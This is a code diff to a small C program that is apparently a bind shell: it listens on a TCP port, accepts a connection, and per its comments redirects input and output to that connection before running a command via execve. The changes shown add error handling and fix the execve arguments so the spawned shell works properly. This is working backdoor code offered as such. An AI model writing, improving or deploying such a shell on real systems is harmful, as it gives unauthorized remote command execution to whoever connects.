@@ -36,6 +36,8 @@
 
 int main() {
 
+  char *args[] = { COMMAND, 0 };
+
   // Socket and connection file descriptors.
   int sock, conn;
 
@@ -45,20 +47,33 @@ int main() {
   // Creating an IPV4 PF_INET socket.
   sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
 
+  if (sock < 0) {
+    perror("sock()");
+    return -1;
+  }
+
   // Preparing listenning address.
-  local.sin_family = PF_INET;
+  local.sin_family = AF_INET;
   local.sin_port = htons(PORT);
   local.sin_addr.s_addr = (REMOTE_IP == INADDR_ANY) ? INADDR_ANY : inet_addr(REMOTE_IP);
 
   // Assigning <local> address to <socket>.
-  bind(sock, (struct sockaddr *)&local, sizeof(struct sockaddr_in));
+  if (bind(sock, (struct sockaddr *)&local, sizeof(struct sockaddr_in)) < 0) {
+    perror("bind()");
+    return -1;
+  }
 
   // Making the socket listen for a connection.
-  listen(sock, 0);
+  if (listen(sock, 0) < 0) {
+    perror("listen()");
+    return -1;
+  }
   printf("Waiting for connection.\n");
 
   // When a connection is received accept it and get the file descriptor.
-  conn = accept(sock, 0, 0);
+  if ((conn = accept(sock, 0, 0)) < 0) {
+    perror("accept()");
+  }
   printf("Got connection!\n");
 
   // This is the actual magic.
@@ -75,7 +90,7 @@ int main() {
 
   // Actually executing command. Remember everything is going to be redirected
   // to <conn>.
-  execve(COMMAND, 0, 0);
+  execve(args[0], args, 0);
 
   // Prepare a clean exit.
   exit(0);
